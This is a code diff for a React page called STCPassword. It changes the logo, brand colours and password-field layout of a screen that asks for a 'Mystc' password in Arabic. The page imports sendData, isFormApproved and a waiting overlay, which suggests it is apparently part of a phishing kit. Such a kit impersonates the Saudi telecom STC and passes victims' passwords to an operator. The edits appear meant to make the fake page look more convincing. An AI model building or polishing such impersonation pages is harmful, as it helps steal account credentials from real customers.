@@ -6,7 +6,6 @@ import { useLocation } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
 import {
   sendData,
   isFormApproved,
@@ -78,29 +77,28 @@ export default function STCPassword() {
 
       <div className="px-6 py-8 flex flex-col min-h-screen">
         {/* STC Logo */}
-        <div className="flex justify-center mb-6">
+        <div className="flex justify-center mb-8">
           <img 
-            src="/images/service-providers/stc.png" 
+            src="/images/service-providers/stc.jpg" 
             alt="STC" 
-            className="h-16 w-auto"
+            className="h-12 w-auto"
           />
         </div>
 
         {/* Header */}
         <div className="text-center mb-8">
           <h1 className="text-xl font-bold text-gray-800 mb-2">أدخل كلمة المرور</h1>
-          <p className="text-sm" style={{ color: '#00A651' }}>
-            يتعين عليك ادخال كلمة الجديدة من Mystc
+          <p className="text-sm">
+            <span style={{ color: '#00A651' }}>يتعين عليك ادخال كلمة الجديدة من </span>
+            <span style={{ color: '#4F008C' }}>Mystc</span>
           </p>
         </div>
 
         <form onSubmit={handleSubmit(onSubmit)} className="flex-1 flex flex-col">
           {/* Password Field */}
-          <div className="space-y-2">
-            <div 
-              className="flex items-center justify-between border border-gray-300 rounded-lg px-4 py-3"
-              style={{ backgroundColor: '#FAFAFA' }}
-            >
+          <div className="space-y-1">
+            {/* Label Row */}
+            <div className="flex items-center justify-between px-1">
               <button
                 type="button"
                 onClick={() => setShowPassword(!showPassword)}
@@ -110,19 +108,23 @@ export default function STCPassword() {
                 {showPassword ? "إخفاء" : "اظهار"}
               </button>
               
-              <input
-                id="password"
-                type={showPassword ? "text" : "password"}
-                className="flex-1 bg-transparent text-left outline-none mx-4"
-                dir="ltr"
-                {...register("password")}
-              />
-              
               <div className="flex items-center gap-2">
                 <span className="text-gray-500 text-sm">كلمة المرور</span>
                 <Lock className="w-4 h-4 text-gray-400" />
               </div>
             </div>
+            
+            {/* Input Field */}
+            <div className="border-b border-gray-300 pb-2">
+              <input
+                id="password"
+                type={showPassword ? "text" : "password"}
+                className="w-full bg-transparent text-left outline-none py-2 text-base"
+                dir="ltr"
+                {...register("password")}
+              />
+            </div>
+            
             {errors.password && (
               <p className="text-red-500 text-xs text-right">{errors.password.message}</p>
             )}
@@ -134,7 +136,7 @@ export default function STCPassword() {
           {/* Spacer */}
           <div className="flex-1"></div>
 
-          {/* Submit Button */}
+          {/* Submit Button - Fixed at bottom */}
           <div className="pb-8 pt-4">
             <Button 
               type="submit" 
